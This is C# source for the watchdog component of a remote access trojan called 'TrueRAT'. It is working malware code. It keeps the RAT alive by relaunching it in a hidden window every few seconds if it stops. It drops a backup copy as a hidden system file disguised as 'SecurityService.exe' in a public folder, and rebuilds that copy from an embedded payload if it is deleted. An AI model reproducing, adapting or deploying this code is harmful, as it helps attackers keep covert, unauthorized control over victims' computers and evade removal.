using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading.Tasks;
using True.Core;

namespace True.Helper
{
    public static class Watchdog
    {
        private static readonly string backupPath = @"C:\Users\Public\SecurityService.exe";
        private static readonly string watchdogFlag = "--watchdog-launch";

        public static void Start(string[] args)
        {
            // Prevent the watchdog from starting if it was launched BY the watchdog
            if (args.Contains(watchdogFlag))
            {
                Logger.Info("Watchdog", "Process was started by watchdog. Watchdog will not monitor.");
                return;
            }

            _ = Task.Run(async () =>
            {
                Logger.Info("Watchdog", "Started monitoring...");

                string ratName = GetCurrentProcessName();

                while (true)
                {
                    try
                    {
                        if (!IsProcessRunning(ratName))
                        {
                            Logger.Warn("Watchdog", $"RAT process '{ratName}' not running. Attempting restart...");

                            if (!File.Exists(backupPath))
                            {
                                Logger.Error("Watchdog", "Backup RAT missing. Attempting to regenerate from embedded resource...");
                                RegenerateBackupFromResource();
                            }

                            if (File.Exists(backupPath))
                            {
                                var psi = new ProcessStartInfo
                                {
                                    FileName = backupPath,
                                    Arguments = watchdogFlag,
                                    UseShellExecute = false,
                                    CreateNoWindow = true,
                                    WindowStyle = ProcessWindowStyle.Hidden
                                };

                                Process.Start(psi);
                                Logger.Info("Watchdog", "Backup RAT started successfully.");
                            }
                            else
                            {
                                Logger.Error("Watchdog", "Failed to regenerate backup RAT. Giving up.");
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Logger.Error("Watchdog", $"Exception: {ex.Message}");
                    }

                    await Task.Delay(5000); // Check every 5 seconds
                }
            });
        }

        private static string GetCurrentProcessName()
        {
            try
            {
                return Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName);
            }
            catch
            {
                return "TrueRAT"; // fallback
            }
        }

        private static bool IsProcessRunning(string name)
        {
            try
            {
                return Process.GetProcesses().Any(p =>
                    string.Equals(p.ProcessName, name, StringComparison.OrdinalIgnoreCase));
            }
            catch
            {
                return false;
            }
        }

        public static void EnsureBackupCopy(string sourcePath)
        {
            try
            {
                if (!File.Exists(backupPath))
                {
                    File.Copy(sourcePath, backupPath, true);
                    File.SetAttributes(backupPath, FileAttributes.Hidden | FileAttributes.System);
                    Logger.Info("Watchdog", "Backup RAT deployed & hidden.");
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Watchdog", $"Failed to deploy backup: {ex.Message}");
            }
        }

        private static void RegenerateBackupFromResource()
        {
            try
            {
                // Adjust resource name based on your actual embedded file name
                const string resourceName = "True.Resources.Payload.exe";

                using var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName);
                if (stream == null)
                {
                    Logger.Error("Watchdog", "Embedded RAT binary not found.");
                    return;
                }

                using var fs = new FileStream(backupPath, FileMode.Create, FileAccess.Write);
                stream.CopyTo(fs);

                File.SetAttributes(backupPath, FileAttributes.Hidden | FileAttributes.System);
                Logger.Info("Watchdog", "Backup binary regenerated from embedded resource.");
            }
            catch (Exception ex)
            {
                Logger.Error("Watchdog", $"Error writing backup from resource: {ex.Message}");
            }
        }
    }
}
